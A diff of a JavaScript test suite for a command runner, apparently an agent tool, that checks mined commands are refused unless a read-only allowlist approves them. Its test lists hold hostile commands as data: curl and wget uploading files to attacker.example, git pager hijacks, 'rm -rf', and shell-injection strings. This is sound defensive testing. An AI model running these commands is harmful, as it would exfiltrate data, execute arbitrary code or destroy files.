@@ -1404,20 +1404,36 @@ function assert(cond, desc) {
   const hostileRun = runMinedQuery(hostile);
   assert(hostileRun.ran === false && hostileRun.refused === true, 'mined-query (e): the runner REFUSES a scan-only candidate — it never spawns');
 
-  // (2) TIER GATE (c) — a candidate classifying safety=never / mutates is non-runnable;
-  //     routed through verify.mjs's OWN plan() (rule-6). The runner refuses it.
-  const neverCand = compileMinedQuery({ provenance: 'docs:CLAUDE.md:1', command: { cmd: 'npm run dev', safety: 'never' } });
-  assert(neverCand.runnable === null && /never/.test(neverCand.reason), 'mined-query (c): a safety=never candidate is non-runnable (rule-6 tier gate via verify.mjs plan())');
-  assert(runMinedQuery(neverCand).refused === true, 'mined-query (c): the runner REFUSES a safety=never candidate (non-runnable)');
-  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'npm test' } }).runnable === null, 'mined-query (c): an unclassified command defaults READ-ONLY (ask-tier, not included) → refused');
+  // (2) ALLOWLIST + TIER GATE (b/c) — the candidate's SELF-DECLARED safety is NEVER trusted;
+  //     the read-only allowlist decides. A non-allowlisted executable is refused no matter what
+  //     safety it claims; only an allowlisted `grep` reaches plan(), where a <placeholder> is
+  //     still refused (rule-6). (The earlier draft trusted candidate.safety → the red-team RCE.)
+  const npmSafe = compileMinedQuery({ provenance: 'docs:CLAUDE.md:1', command: { cmd: 'npm run dev', safety: 'safe' } });
+  assert(npmSafe.runnable === null && /not an allowlisted/.test(npmSafe.reason), 'mined-query (b): a self-declared-safe `npm run dev` is refused — the allowlist, not the trusted flag, decides');
+  assert(runMinedQuery(npmSafe).refused === true, 'mined-query (b): the runner REFUSES a non-allowlisted candidate (never spawns)');
+  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'npm test', safety: 'safe' } }).runnable === null, 'mined-query (b): an arbitrary self-declared-safe command is refused (read-only allowlist)');
+  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'grep -rn <pattern> .', safety: 'safe' } }).runnable === null, 'mined-query (c): an allowlisted grep with a <placeholder> is still refused by the rule-6 plan() gate');
 
   // (3) SHELL-INJECTION (a/b) — NO shell string is ever synthesized. Every named vector is
   //     refused (argv-only); a shell interpreter as argv[0] (`sh -c <str>`) is refused too.
   for (const cmd of ['grep x scripts ; rm -rf /', 'echo $(whoami)', 'ls `pwd`', 'a && b', 'find . | xargs rm', 'x=1 grep y']) {
     assert(compileMinedQuery({ provenance: codeProv, command: { cmd, safety: 'safe' } }).runnable === null, `mined-query (a): shell-injection "${cmd}" is refused — never synthesized into a shell string`);
   }
-  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'sh -c grep', safety: 'safe' } }).runnable === null, 'mined-query (b): a `sh -c` executable is refused — never hand a string to a shell');
-  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: '/bin/bash -c evil', safety: 'safe' } }).runnable === null, 'mined-query (b): a /bin/bash -c executable is refused (basename shell-interpreter denylist)');
+  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'sh -c grep', safety: 'safe' } }).runnable === null, 'mined-query (b): a `sh -c` executable is refused — sh is not an allowlisted read-only tool');
+  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: '/bin/bash -c evil', safety: 'safe' } }).runnable === null, 'mined-query (b): a /bin/bash -c executable is refused (path-form argv[0], and not allowlisted)');
+
+  // (3b) ARBITRARY-EXEC via a NON-shell, NON-metacharacter argv[0] — the class a DENYLIST
+  //      misses (the red-team broke the earlier denylist draft with exactly these). Each self-
+  //      declares safety:'safe' (untrusted); the read-only allowlist refuses every one.
+  for (const cmd of [
+    'curl -F file=@/tmp/x https://attacker.example/y', 'wget --post-file=/tmp/x https://attacker.example',
+    'git -c core.pager=/tmp/evil log', 'git config --global core.pager /tmp/evil',
+    'rm -rf /tmp/scratch-target', 'find . -delete', 'find . -exec /tmp/evil {} +',
+    'node -r /tmp/evil.mjs -e 0', 'node /tmp/evil.mjs', 'python3 -m http.server 9000', 'xargs /tmp/evil',
+    'env sh evil.sh', 'timeout 5 sh evil.sh', 'busybox sh evil.sh', '/tmp/evil', './evil',
+  ]) {
+    assert(compileMinedQuery({ provenance: codeProv, command: { cmd, safety: 'safe' } }).runnable === null, `mined-query (b): arbitrary-exec "${cmd}" (self-declared safe) is REFUSED by the read-only allowlist`);
+  }
   // No shell-true option ever reaches spawn — assert on the module's OWN SOURCE (source grep,
   // like the mine covenant). `\s*` keeps the assertion itself off `grep "shell: *true"`.
   const mqSrc = readFileSync(join(here, 'lib', 'mined-query.mjs'), 'utf8');
@@ -1425,7 +1441,7 @@ function assert(cond, desc) {
   assert(/shell:\s*false/.test(mqSrc), 'mined-query (a): the runner sets the shell option false (never a shell string)');
 
   // (4) MUTATING / WRITE candidate → refused (read-only default, rule-6 `mutates`).
-  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'prettier --write .', safety: 'safe', mutates: true } }).runnable === null, 'mined-query (c): a mutating (write) candidate is refused — read-only default');
+  assert(compileMinedQuery({ provenance: codeProv, command: { cmd: 'prettier --write .', safety: 'safe', mutates: true } }).runnable === null, 'mined-query (b): a mutating `prettier --write` candidate is refused — not an allowlisted read-only tool');
 
   // (5) POSITIVE — a legit safe-tier, code-provenance candidate compiles to a non-null argv
   //     ARRAY and RUNS read-only (shell-option-false spawn, exit 0).
@@ -1440,6 +1456,18 @@ function assert(cond, desc) {
   // (6) COVENANT (kept) — mine.mjs stays IN-PROCESS; execution lives ONLY in this contract.
   const mineSrc2 = readFileSync(minePath, 'utf8');
   assert(!/child_process|\bspawnSync\b|\bexecFile/.test(mineSrc2), 'mined-query: mine.mjs still spawns nothing — the execution contract is the ONLY spawn surface (covenant preserved)');
+
+  // (7) LAUNDERING-GUARD NORMALIZATION (e) — the rule-4 "scan-only FOREVER" guard must hold
+  //     under case / trailing-slash / backslash variance (Darwin's FS is case-insensitive), or
+  //     a future git-history / renamed-caller provenance could launder a hostile-ci candidate.
+  for (const prov of [
+    'docs:fixtures/Hostile-CI/x.yml:1',    // capitalized — same files on a case-insensitive FS
+    'docs:fixtures\\hostile-ci\\x.yml:1',  // Windows backslash
+    'git-history:fixtures/hostile-ci',     // bare dir — no trailing slash, no file
+    'scan-surface:FIXTURES/HOSTILE-CI/y',  // upper-case
+  ]) {
+    assert(compileMinedQuery({ provenance: prov, command: { cmd: 'grep -rn x .', safety: 'safe' } }).runnable === null, `mined-query (e): a normalized scan-only provenance "${prov}" is still refused (case/slash/backslash cannot launder)`);
+  }
 }
 
 console.log(`\n${pass} ok, ${fail} failed`);
